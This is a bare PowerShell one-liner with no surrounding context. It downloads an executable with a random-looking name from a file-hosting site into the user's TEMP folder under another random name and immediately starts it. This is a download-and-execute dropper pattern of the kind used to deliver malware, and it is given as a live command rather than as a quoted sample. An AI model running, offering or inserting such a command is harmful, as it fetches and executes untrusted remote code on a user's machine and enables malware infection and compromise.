
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/vjadwb.exe',"$env:TEMP\euioko.exe");Start-Process ("$env:TEMP\euioko.exe")

